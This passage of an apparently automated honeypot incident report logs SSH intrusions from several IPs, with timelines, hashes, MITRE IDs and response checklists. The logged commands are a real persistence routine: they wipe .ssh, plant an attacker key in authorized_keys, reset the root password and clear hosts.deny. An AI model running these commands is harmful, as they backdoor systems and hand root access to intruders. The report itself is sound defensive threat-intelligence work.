| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ludEaiwlXYyL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:20:56` | `cowrie.session.connect` |
| `2026-04-13 04:20:56` | `cowrie.client.version` |
| `2026-04-13 04:20:56` | `cowrie.client.kex` |
| `2026-04-13 04:20:56` | `cowrie.login.success` |
| `2026-04-13 04:20:57` | `cowrie.session.params` |
| `2026-04-13 04:20:57` | `cowrie.command.input` |
| `2026-04-13 04:20:57` | `cowrie.command.failed` |
| `2026-04-13 04:20:57` | `cowrie.log.closed` |
| `2026-04-13 04:20:57` | `cowrie.session.params` |
| `2026-04-13 04:20:57` | `cowrie.command.input` |
| `2026-04-13 04:20:57` | `cowrie.session.file_download` |
| `2026-04-13 04:20:57` | `cowrie.log.closed` |
| `2026-04-13 04:21:09` | `cowrie.session.params` |
| `2026-04-13 04:21:09` | `cowrie.command.input` |
| `2026-04-13 04:21:09` | `cowrie.log.closed` |
| `2026-04-13 04:21:10` | `cowrie.session.params` |
| `2026-04-13 04:21:10` | `cowrie.command.input` |
| `2026-04-13 04:21:10` | `cowrie.log.closed` |
| `2026-04-13 04:21:10` | `cowrie.session.params` |
| `2026-04-13 04:21:10` | `cowrie.command.input` |
| `2026-04-13 04:21:10` | `cowrie.session.file_download` |
| `2026-04-13 04:21:10` | `cowrie.log.closed` |
| `2026-04-13 04:21:11` | `cowrie.session.params` |
| `2026-04-13 04:21:11` | `cowrie.command.input` |
| `2026-04-13 04:21:11` | `cowrie.log.closed` |
| `2026-04-13 04:21:11` | `cowrie.session.params` |
| `2026-04-13 04:21:11` | `cowrie.command.input` |
| `2026-04-13 04:21:11` | `cowrie.log.closed` |
| `2026-04-13 04:21:12` | `cowrie.session.params` |
| `2026-04-13 04:21:12` | `cowrie.command.input` |
| `2026-04-13 04:21:12` | `cowrie.command.input` |
| `2026-04-13 04:21:12` | `cowrie.log.closed` |
| `2026-04-13 04:21:12` | `cowrie.session.params` |
| `2026-04-13 04:21:12` | `cowrie.command.input` |
| `2026-04-13 04:21:12` | `cowrie.log.closed` |
| `2026-04-13 04:21:13` | `cowrie.session.params` |
| `2026-04-13 04:21:13` | `cowrie.command.input` |
| `2026-04-13 04:21:13` | `cowrie.log.closed` |
| `2026-04-13 04:21:13` | `cowrie.session.params` |
| `2026-04-13 04:21:13` | `cowrie.command.input` |
| `2026-04-13 04:21:14` | `cowrie.log.closed` |
| `2026-04-13 04:21:14` | `cowrie.session.params` |
| `2026-04-13 04:21:14` | `cowrie.command.input` |
| `2026-04-13 04:21:14` | `cowrie.log.closed` |
| `2026-04-13 04:21:14` | `cowrie.session.params` |
| `2026-04-13 04:21:14` | `cowrie.command.input` |
| `2026-04-13 04:21:14` | `cowrie.log.closed` |
| `2026-04-13 04:21:15` | `cowrie.session.params` |
| `2026-04-13 04:21:15` | `cowrie.command.input` |
| `2026-04-13 04:21:15` | `cowrie.log.closed` |
| `2026-04-13 04:21:15` | `cowrie.session.params` |
| `2026-04-13 04:21:15` | `cowrie.command.input` |
| `2026-04-13 04:21:15` | `cowrie.log.closed` |
| `2026-04-13 04:21:16` | `cowrie.session.params` |
| `2026-04-13 04:21:16` | `cowrie.command.input` |
| `2026-04-13 04:21:16` | `cowrie.log.closed` |
| `2026-04-13 04:21:16` | `cowrie.session.params` |
| `2026-04-13 04:21:16` | `cowrie.command.input` |
| `2026-04-13 04:21:17` | `cowrie.log.closed` |
| `2026-04-13 04:21:17` | `cowrie.session.params` |
| `2026-04-13 04:21:17` | `cowrie.command.input` |
| `2026-04-13 04:21:17` | `cowrie.log.closed` |
| `2026-04-13 04:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.71.116[.]214` to AbuseIPDB if not already reported
- [ ] Block `222.71.116[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728bcdecd1da

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:22 |
| **Last Seen** | 2026-04-13 04:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:22:18` | `cowrie.session.connect` |
| `2026-04-13 04:22:18` | `cowrie.client.version` |
| `2026-04-13 04:22:18` | `cowrie.client.kex` |
| `2026-04-13 04:22:19` | `cowrie.login.success` |
| `2026-04-13 04:22:20` | `cowrie.session.params` |
| `2026-04-13 04:22:20` | `cowrie.command.input` |
| `2026-04-13 04:22:20` | `cowrie.command.failed` |
| `2026-04-13 04:22:20` | `cowrie.log.closed` |
| `2026-04-13 04:22:21` | `cowrie.session.params` |
| `2026-04-13 04:22:21` | `cowrie.command.input` |
| `2026-04-13 04:22:21` | `cowrie.session.file_download` |
| `2026-04-13 04:22:21` | `cowrie.log.closed` |
| `2026-04-13 04:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d422896faf53

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:22 |
| **Last Seen** | 2026-04-13 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:22:24` | `cowrie.session.connect` |
| `2026-04-13 04:22:24` | `cowrie.client.version` |
| `2026-04-13 04:22:24` | `cowrie.client.kex` |
| `2026-04-13 04:22:26` | `cowrie.login.success` |
| `2026-04-13 04:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fce3fb9ba9b3

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:22 |
| **Last Seen** | 2026-04-13 04:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:22:28` | `cowrie.session.connect` |
| `2026-04-13 04:22:28` | `cowrie.client.version` |
| `2026-04-13 04:22:28` | `cowrie.client.kex` |
| `2026-04-13 04:22:29` | `cowrie.login.success` |
| `2026-04-13 04:22:29` | `cowrie.session.params` |
| `2026-04-13 04:22:29` | `cowrie.command.input` |
| `2026-04-13 04:22:29` | `cowrie.command.failed` |
| `2026-04-13 04:22:29` | `cowrie.log.closed` |
| `2026-04-13 04:22:29` | `cowrie.session.params` |
| `2026-04-13 04:22:29` | `cowrie.command.input` |
| `2026-04-13 04:22:29` | `cowrie.session.file_download` |
| `2026-04-13 04:22:29` | `cowrie.log.closed` |
| `2026-04-13 04:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31174548143

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:22 |
| **Last Seen** | 2026-04-13 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:22:31` | `cowrie.session.connect` |
| `2026-04-13 04:22:31` | `cowrie.client.version` |
| `2026-04-13 04:22:31` | `cowrie.client.kex` |
| `2026-04-13 04:22:31` | `cowrie.login.success` |
| `2026-04-13 04:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff65353e516

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:22 |
| **Last Seen** | 2026-04-13 04:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:22:41` | `cowrie.session.connect` |
| `2026-04-13 04:22:41` | `cowrie.client.version` |
| `2026-04-13 04:22:41` | `cowrie.client.kex` |
| `2026-04-13 04:22:41` | `cowrie.login.success` |
| `2026-04-13 04:22:41` | `cowrie.session.params` |
| `2026-04-13 04:22:41` | `cowrie.command.input` |
| `2026-04-13 04:22:41` | `cowrie.command.failed` |
| `2026-04-13 04:22:42` | `cowrie.log.closed` |
| `2026-04-13 04:22:42` | `cowrie.session.params` |
| `2026-04-13 04:22:42` | `cowrie.command.input` |
| `2026-04-13 04:22:42` | `cowrie.session.file_download` |
| `2026-04-13 04:22:42` | `cowrie.log.closed` |
| `2026-04-13 04:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300050b0a41f

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:22 |
| **Last Seen** | 2026-04-13 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:22:47` | `cowrie.session.connect` |
| `2026-04-13 04:22:47` | `cowrie.client.version` |
| `2026-04-13 04:22:47` | `cowrie.client.kex` |
| `2026-04-13 04:22:48` | `cowrie.login.success` |
| `2026-04-13 04:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ff8a0a5728

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:23 |
| **Last Seen** | 2026-04-13 04:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:23:45` | `cowrie.session.connect` |
| `2026-04-13 04:23:45` | `cowrie.client.version` |
| `2026-04-13 04:23:46` | `cowrie.client.kex` |
| `2026-04-13 04:23:47` | `cowrie.login.success` |
| `2026-04-13 04:23:47` | `cowrie.session.params` |
| `2026-04-13 04:23:47` | `cowrie.command.input` |
| `2026-04-13 04:23:47` | `cowrie.command.failed` |
| `2026-04-13 04:23:48` | `cowrie.log.closed` |
| `2026-04-13 04:23:48` | `cowrie.session.params` |
| `2026-04-13 04:23:48` | `cowrie.command.input` |
| `2026-04-13 04:23:48` | `cowrie.session.file_download` |
| `2026-04-13 04:23:48` | `cowrie.log.closed` |
| `2026-04-13 04:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd6f02111001

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:23 |
| **Last Seen** | 2026-04-13 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:23:52` | `cowrie.session.connect` |
| `2026-04-13 04:23:52` | `cowrie.client.version` |
| `2026-04-13 04:23:52` | `cowrie.client.kex` |
| `2026-04-13 04:23:53` | `cowrie.login.success` |
| `2026-04-13 04:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c459f325c8

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:25 |
| **Last Seen** | 2026-04-13 04:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:25:54` | `cowrie.session.connect` |
| `2026-04-13 04:25:54` | `cowrie.client.version` |
| `2026-04-13 04:25:54` | `cowrie.client.kex` |
| `2026-04-13 04:25:55` | `cowrie.login.success` |
| `2026-04-13 04:25:55` | `cowrie.session.params` |
| `2026-04-13 04:25:55` | `cowrie.command.input` |
| `2026-04-13 04:25:55` | `cowrie.command.failed` |
| `2026-04-13 04:25:55` | `cowrie.log.closed` |
| `2026-04-13 04:25:55` | `cowrie.session.params` |
| `2026-04-13 04:25:55` | `cowrie.command.input` |
| `2026-04-13 04:25:55` | `cowrie.session.file_download` |
| `2026-04-13 04:25:55` | `cowrie.log.closed` |
| `2026-04-13 04:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05d8dea2d626

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:25 |
| **Last Seen** | 2026-04-13 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:25:57` | `cowrie.session.connect` |
| `2026-04-13 04:25:57` | `cowrie.client.version` |
| `2026-04-13 04:25:57` | `cowrie.client.kex` |
| `2026-04-13 04:25:57` | `cowrie.login.success` |
| `2026-04-13 04:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f27446d047

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:26 |
| **Last Seen** | 2026-04-13 04:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:26:04` | `cowrie.session.connect` |
| `2026-04-13 04:26:04` | `cowrie.client.version` |
| `2026-04-13 04:26:04` | `cowrie.client.kex` |
| `2026-04-13 04:26:04` | `cowrie.login.success` |
| `2026-04-13 04:26:05` | `cowrie.session.params` |
| `2026-04-13 04:26:05` | `cowrie.command.input` |
| `2026-04-13 04:26:05` | `cowrie.command.failed` |
| `2026-04-13 04:26:05` | `cowrie.log.closed` |
| `2026-04-13 04:26:05` | `cowrie.session.params` |
| `2026-04-13 04:26:05` | `cowrie.command.input` |
| `2026-04-13 04:26:05` | `cowrie.session.file_download` |
| `2026-04-13 04:26:05` | `cowrie.log.closed` |
| `2026-04-13 04:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c25e3fe4f5

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:26 |
| **Last Seen** | 2026-04-13 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:26:12` | `cowrie.session.connect` |
| `2026-04-13 04:26:12` | `cowrie.client.version` |
| `2026-04-13 04:26:13` | `cowrie.client.kex` |
| `2026-04-13 04:26:13` | `cowrie.login.success` |
| `2026-04-13 04:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b5938635bb

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:27 |
| **Last Seen** | 2026-04-13 04:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:27:44` | `cowrie.session.connect` |
| `2026-04-13 04:27:44` | `cowrie.client.version` |
| `2026-04-13 04:27:44` | `cowrie.client.kex` |
| `2026-04-13 04:27:45` | `cowrie.login.success` |
| `2026-04-13 04:27:45` | `cowrie.session.params` |
| `2026-04-13 04:27:45` | `cowrie.command.input` |
| `2026-04-13 04:27:45` | `cowrie.command.failed` |
| `2026-04-13 04:27:45` | `cowrie.log.closed` |
| `2026-04-13 04:27:45` | `cowrie.session.params` |
| `2026-04-13 04:27:45` | `cowrie.command.input` |
| `2026-04-13 04:27:46` | `cowrie.session.file_download` |
| `2026-04-13 04:27:46` | `cowrie.log.closed` |
| `2026-04-13 04:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15569a4bf42

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:27 |
| **Last Seen** | 2026-04-13 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
